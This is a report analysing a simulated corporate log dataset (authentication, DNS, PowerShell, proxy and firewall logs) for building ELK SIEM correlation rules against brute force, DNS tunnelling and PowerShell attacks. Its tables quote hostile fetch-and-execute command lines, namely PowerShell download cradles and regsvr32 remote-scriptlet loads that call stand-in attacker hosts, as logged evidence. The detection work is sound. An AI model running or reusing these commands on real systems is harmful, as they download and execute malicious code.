# Report 02 — Dataset Analysis

**Project:** SIEM Correlation Rules — ELK Stack
**Date:** 2026-07-07 | **Log Date:** 2026-06-15
**Version:** 1.0

---

## Table of Contents

1. [Overview](#1-overview)
2. [Log Source Inventory](#2-log-source-inventory)
3. [Authentication Logs](#3-authentication-logs)
4. [DNS Logs](#4-dns-logs)
5. [PowerShell and Network Logs](#5-powershell-and-network-logs)
6. [Event Distribution Summary](#6-event-distribution-summary)
7. [Timeline of Notable Events](#7-timeline-of-notable-events)

---

## 1. Overview

All log data was collected on **2026-06-15** across a simulated corporate environment (CORP domain). Twelve log files were ingested spanning authentication, DNS, PowerShell, process creation, network connections, proxy traffic, and firewall events. The collection window covers approximately 5.5 hours (00:00–05:31 UTC).

| Metric | Value |
|--------|-------|
| Total log files | 12 |
| Total log lines | 1,385 |
| Collection start | 2026-06-15 00:00:00 |
| Collection end | 2026-06-15 05:31:00 |
| Unique source hosts | 15 |
| Unique user accounts observed | 10 |
| Malicious IPs identified | 3 |
| Malicious domains identified | 2 |

---

## 2. Log Source Inventory

| # | File Path | Format | Lines | Key Fields | Primary Use |
|---|-----------|--------|-------|------------|-------------|
| 1 | `authentication/windows_security.log` | Windows Event Log (text) | 130 | EventID, AccountName, SourceNetworkAddress, LogonType | Credential stuffing, lockouts |
| 2 | `authentication/ssh.log` | syslog (sshd) | 131 | hostname, user, src_ip, port, result | SSH brute force |
| 3 | `authentication/auth.log` | Linux PAM/syslog | 115 | hostname, service, user, result, src_ip | Linux auth events |
| 4 | `dns/dns.log` | BIND named syslog | 140 | client_ip, query, record_type, resolver | DNS tunnelling |
| 5 | `dns/dns_queries.log` | CSV structured | 131 | timestamp, client_ip, query, record_type, response_code | DNS tunnelling |
| 6 | `dns/zeek_dns.log` | Zeek TSV | 137 | ts, uid, orig_h, query, qtype_name, answers, TTL | DNS tunnelling (network layer) |
| 7 | `network/powershell.log` | Windows Event Log (text) | 100 | EventID, CommandName, User, ScriptBlock | PowerShell exploitation |
| 8 | `network/process_creation.log` | Windows Security 4688 | 100 | NewProcessName, CommandLine, CreatorProcess, AccountName | LOLBAS, payload execution |
| 9 | `network/sysmon.log` | Sysmon Event ID 1 | 110 | Image, CommandLine, ParentImage, User, Hashes | PowerShell from Office, LOLBAS |
| 10 | `powershell/proxy.log` | Squid-style access log | 120 | client_ip, user, method, url, status, bytes, user_agent | Download cradles, C2 beaconing |
| 11 | `powershell/firewall.log` | iptables kernel log | 140 | direction, src_ip, dst_ip, proto, dpt, action | External attacker scanning |
| 12 | `powershell/network_connections.log` | CSV structured | 131 | timestamp, src_ip, dst_ip, dst_port, proto, bytes, status | C2 persistence, lateral movement |

---

## 3. Authentication Logs

### 3.1 windows_security.log

Contains Windows Security Audit events from seven domain-joined hosts. Key Event IDs observed:

| Event ID | Description | Count (approx.) |
|----------|-------------|-----------------|
| 4624 | Successful logon | 38 |
| 4625 | Failed logon | 36 |
| 4634 | Logoff | 42 |
| 4672 | Special privileges assigned | 6 |
| 4688 | New process created | 8 |
| 4740 | Account locked out | 5 |

**Logon Types observed:**

| Logon Type | Meaning | Notes |
|------------|---------|-------|
| 2 | Interactive | Local console logon |
| 3 | Network | SMB / mapped drives |
| 10 | RemoteInteractive | RDP |

**Account Lockouts (Event 4740):**

| Timestamp | Account | Host | Caller IP |
|-----------|---------|------|-----------|
| 2026-06-15 01:02:15 | kpatel | WKS-FIN07 | 10.22.9.11 |
| 2026-06-15 01:25:38 | nreddy | WKS-ENG14 | 10.21.7.22 |
| 2026-06-15 01:37:13 | rgupta | WKS-ENG14 | 10.21.7.244 |
| 2026-06-15 01:56:44 | lchen | SRV-FILE02 | 172.16.5.74 |
| 2026-06-15 01:59:58 | dwilson | WKS-HR03 | 172.16.5.114 |

**Special Privilege Assignments (Event 4672 — SeDebugPrivilege):**

| Timestamp | Account | Host |
|-----------|---------|------|
| 2026-06-15 00:01:00 | svc_backup | SRV-APP05 |
| 2026-06-15 00:27:59 | jsmith | WKS-SALES22 |
| 2026-06-15 01:03:42 | dwilson | WKS-FIN07 |
| 2026-06-15 01:39:43 | svc_sql | SRV-APP05 |
| 2026-06-15 02:22:09 | amehta | WKS-SALES22 |
| 2026-06-15 02:53:54 | dwilson | SRV-DC01 |

### 3.2 ssh.log (OpenSSH)

Captures SSH daemon events from six Linux servers. The dominant pattern is repeated `pam_unix(sshd:auth): authentication failure` and `Failed password` entries from **185.220.101.47** targeting common usernames.

**Brute-Force Target Accounts from 185.220.101.47:**

| Username | Hosts Targeted | Sample Timestamp |
|----------|---------------|-----------------|
| ubuntu | web-prod01, bastion01 | 00:28:38, 01:16:26 |
| backup | app-prod03 | 00:43:39 |
| deploy | app-prod03, mail-relay01 | 01:05:51, 02:00:30 |
| oracle | web-prod02, bastion01 | 00:48:24, 03:02 |
| root | app-prod03 | 01:07:48, 01:36:34 |
| admin | app-prod03, bastion01 | 01:57:11, 01:54:20 |
| administrator | mail-relay01, bastion01 | 01:01:37, 02:16:24 |
| postgres | db-prod01, web-prod01 | 02:22:05, 03:08:27 |
| test | db-prod01 | 01:52:12 |
| svc_backup | mail-relay01, db-prod01 | 00:51:20, 02:57:53 |
| svc_sql | bastion01 | 01:52:59 |

**Successful SSH logins (legitimate):**

| Timestamp | User | Host | Source IP | Method |
|-----------|------|------|-----------|--------|
| 00:33:49 | jsmith | mail-relay01 | 10.20.11.19 | password |
| 00:36:49 | nreddy | app-prod03 | 172.16.5.173 | publickey |
| 01:50:36 | tverma | app-prod03 | 10.22.9.236 | publickey |
| 01:59:41 | svc_backup | db-prod01 | 10.20.11.173 | password |
| 02:31:03 | svc_backup | bastion01 | 10.20.11.221 | publickey |
| 03:02:17 | lchen | web-prod01 | 10.22.9.148 | publickey |
| 03:28:22 | kpatel | db-prod01 | 10.20.4.249 | password |
| 03:35:57 | svc_sql | app-prod03 | 10.21.7.173 | publickey |
| 04:15:18 | lchen | web-prod02 | 10.22.9.172 | password |

### 3.3 auth.log

Linux PAM authentication log. Notable entries include:

- Repeated `Failed password for invalid user` from **185.220.101.47** and **103.68.22.9**
- `sudo` executions by `svc_backup` (nginx restart on mail-relay01 and web-prod02)
- `sudo` by `amehta` (nginx restart on bastion01)
- Normal CRON job entries (`/usr/lib/php/sessionclean`)
- Multiple successful `Session opened` entries for legitimate users

---

## 4. DNS Logs

### 4.1 dns.log (BIND named)

Structured syslog output from BIND on dns-srv01. Contains client IP, query name, record type, and resolver.

**Legitimate query types observed:**

| Domain | Record Types | Notes |
|--------|-------------|-------|
| office365.com | A, CNAME, MX | Microsoft 365 traffic |
| slack.com | A, CNAME, MX | Collaboration tool |
| github.com | A, CNAME, MX | Developer tool |
| microsoft.com | A, CNAME, MX | Microsoft services |
| google.com | A, CNAME, MX | General internet |
| cloudflare.com | A, CNAME | CDN |
| akamai.net | A, CNAME, MX | CDN |
| corp.local | A, CNAME, AAAA | Internal domain |
| fileshare.corp.local | A, CNAME, AAAA | Internal file share |
| intranet.corp.local | A, CNAME, AAAA | Internal intranet |
| mail.corp.local | A, CNAME, AAAA | Internal mail |

**Suspicious TXT queries to cdn-sync-update.net (sample):**

| Timestamp | Client IP | Query (subdomain) |
|-----------|-----------|-------------------|
| 00:23:33 | 172.16.5.104 | bbz2sf6f7low4vssruraldol65wvjx8uibrsz1n3iuzgppoh.cdn-sync-update.net |
| 00:25:18 | 10.20.11.134 | u9rn8qtty5y2jr8kk791zyrru7zkut6o.cdn-sync-update.net |
| 00:29:32 | 172.16.5.191 | ib6iidlrye89fx5rx1kkc1xi04b7p47b42g05kbkv7mqxs6e.cdn-sync-update.net |
| 00:37:09 | 172.16.5.53 | tf4pyzr6qceouuylajahcpztc69qkgex08n6q7nc85e4e9oe.cdn-sync-update.net |
| 00:41:33 | 10.22.9.144 | eihx74d0gjyv5g10ur5l8a78e9rivh6t1ntmjsrd9q46nouh.cdn-sync-update.net |
| 00:47:38 | 10.20.4.136 | 4c3baewcfhqcw76xatoaztkszp7g7siw.cdn-sync-update.net |
| 00:52:23 | 10.22.9.99 | tcagrp2u4dtbh55rbc76ub7l8v1zocfi4o6l1f90.cdn-sync-update.net |

### 4.2 dns_queries.log (CSV)

Structured CSV with timestamp, client_ip, query, record_type, response_code. Confirms the same TXT query pattern with NOERROR responses, indicating the DNS server is successfully resolving the tunnelling domain.

**Response code distribution:**

| Response Code | Count (approx.) | Meaning |
|---------------|-----------------|---------|
| NOERROR | 121 | Query resolved successfully |
| NXDOMAIN | 10 | Domain not found |

### 4.3 zeek_dns.log (Network Layer)

Zeek captures DNS at the packet level, providing additional fields including `uid`, `TTL`, and full `answers` content. Key finding: TXT responses from cdn-sync-update.net contain **long base64-encoded payloads** in the answer field, confirming active DNS tunnelling data exfiltration.

**Sample Zeek TXT record with answer payload:**

```
ts: 1781482478.000000
query: d8wj0uunnv6cj9io3m25a5piskffv3xoleyrvxoieves.cdn-sync-update.net
qtype: TXT
TTL: 60.000000
answer: cjg8vuazxkdq95g3v23gxj0mqvindh4spfdrwb2serev361xsnbti22nv01z
```

The TTL of **60 seconds** (versus 300–3600 for legitimate records) is a strong indicator of dynamically generated tunnelling subdomains.

---

## 5. PowerShell and Network Logs

### 5.1 network/powershell.log (PowerShell Operational)

Windows PowerShell Event Log from multiple hosts. Key Event IDs:

| Event ID | Description | Significance |
|----------|-------------|--------------|
| 4103 | Module / pipeline execution | Records cmdlet invocations and parameters |
| 4104 | Script block logging | Captures full script text before execution — critical for detecting obfuscated code |
| 4100 | Engine stop | Normal session termination |

**Malicious Script Blocks Captured (Event 4104):**

| Timestamp | Host | User | Script Block (truncated) |
|-----------|------|------|--------------------------|
| 02:07:56 | WKS-SALES22 | rgupta | `IEX (New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/stage2.ps1')` |
| 02:22:26 | WKS-FIN07 | tverma | `powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBP...` |
| 02:55:39 | SRV-APP05 | svc_backup | `(New-Object System.Net.WebClient).DownloadFile('http://185.220.101.47/update.exe','C:\Users\svc_backup\AppData\Local\Temp\update.exe')` |
| 03:29:53 | SRV-APP05 | nreddy | `powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBP...` |
| 04:20:07 | WKS-SALES22 | svc_backup | `(New-Object System.Net.WebClient).DownloadFile('http://185.220.101.47/update.exe','C:\Users\svc_backup\AppData\Local\Temp\update.exe')` |
| 04:27:36 | WKS-FIN07 | svc_sql | `powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBP...` |
| 04:48:27 | WKS-SALES22 | kpatel | `powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBP...` |
| 04:51:46 | SRV-DC01 | jsmith | `IEX (New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/stage2.ps1')` |
| 04:59:36 | SRV-DC01 | nreddy | `IEX (New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/stage2.ps1')` |
| 05:10:07 | WKS-FIN07 | kpatel | `(New-Object System.Net.WebClient).DownloadFile('http://185.220.101.47/update.exe','C:\Users\kpatel\AppData\Local\Temp\update.exe')` |

### 5.2 network/sysmon.log (Sysmon Event ID 1)

Sysmon process creation records with SHA256 hashes and parent process information.

**Malicious PowerShell spawned from Office applications:**

| Timestamp | Host | Parent Process | Child Process | User |
|-----------|------|---------------|---------------|------|
| 00:46:06 | SRV-APP05 | EXCEL.EXE | powershell.exe -NoP -NonI -W Hidden -Enc | kpatel |
| 00:51:20 | SRV-FILE02 | EXCEL.EXE | powershell.exe -NoP -NonI -W Hidden -Enc | nreddy |
| 00:54:10 | WKS-ENG14 | WINWORD.EXE | powershell.exe -NoP -NonI -W Hidden -Enc | svc_sql |
| 00:57:58 | WKS-FIN07 | cmd.exe | powershell.exe -NoP -NonI -W Hidden -Enc | svc_sql |
| 01:03:02 | SRV-DC01 | WINWORD.EXE | powershell.exe -NoP -NonI -W Hidden -Enc | tverma |
| 01:14:01 | WKS-SALES22 | WINWORD.EXE | powershell.exe -NoP -NonI -W Hidden -Enc | svc_sql |
| 01:19:55 | WKS-FIN07 | cmd.exe | powershell.exe -NoP -NonI -W Hidden -Enc | tverma |
| 01:29:50 | SRV-APP05 | EXCEL.EXE | powershell.exe -NoP -NonI -W Hidden -Enc | jsmith |
| 01:54:33 | SRV-APP05 | EXCEL.EXE | powershell.exe -NoP -NonI -W Hidden -Enc | tverma |
| 01:55:48 | WKS-FIN07 | cmd.exe | powershell.exe -NoP -NonI -W Hidden -Enc | tverma |

### 5.3 network/process_creation.log (Event ID 4688)

**LOLBAS (Living Off the Land Binaries) activity:**

| Timestamp | Host | Process | Command Line | User |
|-----------|------|---------|--------------|------|
| 00:44:25 | SRV-APP05 | regsvr32.exe | `regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll` | amehta |
| 00:45:26 | WKS-SALES22 | rundll32.exe | `rundll32.exe C:\Users\kpatel\AppData\Local\Temp\payload.dll,DllMain` | kpatel |
| 00:53:26 | SRV-FILE02 | rundll32.exe | `rundll32.exe C:\Users\amehta\AppData\Local\Temp\payload.dll,DllMain` | amehta |
| 01:40:43 | SRV-APP05 | regsvr32.exe | `regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll` | amehta |
| 01:45:03 | SRV-FILE02 | regsvr32.exe | `regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll` | rgupta |
| 01:57:51 | WKS-ENG14 | rundll32.exe | `rundll32.exe C:\Users\rgupta\AppData\Local\Temp\payload.dll,DllMain` | rgupta |
| 02:15:05 | WKS-SALES22 | regsvr32.exe | `regsvr32.exe /s /u /i:http://cdn-sync-update.net/x.sct scrobj.dll` | jsmith |

### 5.4 powershell/proxy.log

Web proxy access log capturing HTTP/HTTPS traffic through the corporate proxy.

**Malicious URLs accessed:**

| Timestamp | User | URL | User Agent | Status |
|-----------|------|-----|------------|--------|
| 00:25:46 | svc_backup | http://malicious-update-cdn.net/stage2.ps1 | WindowsPowerShell/5.1 | 200 |
| 00:41:18 | jsmith | http://malicious-update-cdn.net/stage2.ps1 | WindowsPowerShell/5.1 | 200 |
| 01:20:09 | rgupta | http://malicious-update-cdn.net/stage2.ps1 | WindowsPowerShell/5.1 | 200 |

**DNS-over-HTTPS beaconing:**

| Timestamp | User | URL | Status |
|-----------|------|-----|--------|
| 00:32:34 | lchen | POST https://cdn-sync-update.net/dns-query | 200 |
| 00:33:22 | svc_sql | POST https://cdn-sync-update.net/dns-query | 200 |
| 00:47:45 | nreddy | POST https://cdn-sync-update.net/dns-query | 200 |
| 00:55:45 | kpatel | POST https://cdn-sync-update.net/dns-query | 200 |

### 5.5 powershell/firewall.log

**Inbound scanning/attack attempts blocked:**

| Source IP | Target | Port | Protocol | Action | Pattern |
|-----------|--------|------|----------|--------|---------|
| 185.220.101.47 | 10.20.11.139 | 22 | TCP | DENY | SSH brute force |
| 185.220.101.47 | 172.16.5.184 | 3389 | TCP | DENY | RDP brute force |
| 185.220.101.47 | 172.16.5.113 | 445 | TCP | DENY | SMB scanning |
| 185.220.101.47 | 10.20.11.119 | 3389 | TCP | DENY | RDP brute force |
| 45.146.164.110 | 10.22.9.7 | 3389 | TCP | DENY | RDP scanning |
| 45.146.164.110 | 172.16.5.193 | 445 | TCP | DENY | SMB scanning |

**Outbound connections to threat actor IPs (ALLOW):**

| Source IP | Destination | Port | Bytes | Status |
|-----------|-------------|------|-------|--------|
| 10.21.7.182 | 185.220.101.47 | 443 | 659,582 | ESTABLISHED |
| 10.20.4.133 | 91.203.145.12 | 443 | 775,654 | ESTABLISHED |
| 10.20.11.250 | 103.68.22.9 | 443 | 558,213 | ESTABLISHED |
| 10.20.4.46 | 103.68.22.9 | 443 | 768,846 | ESTABLISHED |

---

## 6. Event Distribution Summary

| Log Source | Total Events | Malicious Events | Benign Events | Malicious % |
|------------|-------------|-----------------|---------------|-------------|
| windows_security.log | 130 | 41 (failures+lockouts) | 89 | 32% |
| ssh.log | 131 | 62 (brute force) | 69 | 47% |
| auth.log | 115 | 8 (brute force+invalid) | 107 | 7% |
| dns.log | 140 | 48 (TXT tunnelling) | 92 | 34% |
| dns_queries.log | 131 | 47 (TXT tunnelling) | 84 | 36% |
| zeek_dns.log | 137 | 45 (TXT tunnelling) | 92 | 33% |
| powershell.log | 100 | 22 (malicious scripts) | 78 | 22% |
| process_creation.log | 100 | 7 (LOLBAS) | 93 | 7% |
| sysmon.log | 110 | 10 (PS from Office) | 100 | 9% |
| proxy.log | 120 | 7 (malicious URLs) | 113 | 6% |
| firewall.log | 140 | 31 (deny+suspicious) | 109 | 22% |
| network_connections.log | 131 | 4 (C2 established) | 127 | 3% |

---

## 7. Timeline of Notable Events

| Timestamp | Event | Source | Significance |
|-----------|-------|--------|--------------|
| 00:01:00 | svc_backup assigned SeDebugPrivilege | windows_security.log | Privilege escalation indicator |
| 00:23:33 | First TXT query to cdn-sync-update.net | dns.log | DNS tunnelling begins |
| 00:25:46 | svc_backup downloads stage2.ps1 | proxy.log | PowerShell C2 stage 2 |
| 00:41:18 | jsmith downloads stage2.ps1 | proxy.log | Account compromised |
| 00:43:39 | SSH brute force — backup/185.220.101.47 | ssh.log | Active brute force |
| 00:44:25 | regsvr32 LOLBAS — cdn-sync-update.net | process_creation.log | Living-off-the-land attack |
| 00:46:06 | powershell.exe spawned from EXCEL.EXE | sysmon.log | Macro-based execution |
| 01:02:15 | kpatel account locked out | windows_security.log | Credential stuffing confirmed |
| 01:20:09 | rgupta downloads stage2.ps1 | proxy.log | Lateral spread of payload |
| 01:25:38 | nreddy account locked out | windows_security.log | Credential stuffing confirmed |
| 01:37:13 | rgupta account locked out | windows_security.log | Credential stuffing confirmed |
| 01:56:44 | lchen account locked out | windows_security.log | Credential stuffing confirmed |
| 01:59:58 | dwilson account locked out | windows_security.log | Credential stuffing confirmed |
| 02:07:56 | IEX DownloadString on WKS-SALES22 (rgupta) | powershell.log | Fileless payload execution |
| 02:22:26 | Encoded PS on WKS-FIN07 (tverma) | powershell.log | Obfuscated C2 stager |
| 02:55:39 | DownloadFile update.exe (svc_backup) | powershell.log | Malware binary dropped |
| 04:51:46 | IEX DownloadString on SRV-DC01 (jsmith) | powershell.log | Domain controller compromised |
| 04:59:36 | IEX DownloadString on SRV-DC01 (nreddy) | powershell.log | DC exploitation ongoing |
| 05:10:07 | DownloadFile update.exe (kpatel) | powershell.log | Further malware staging |
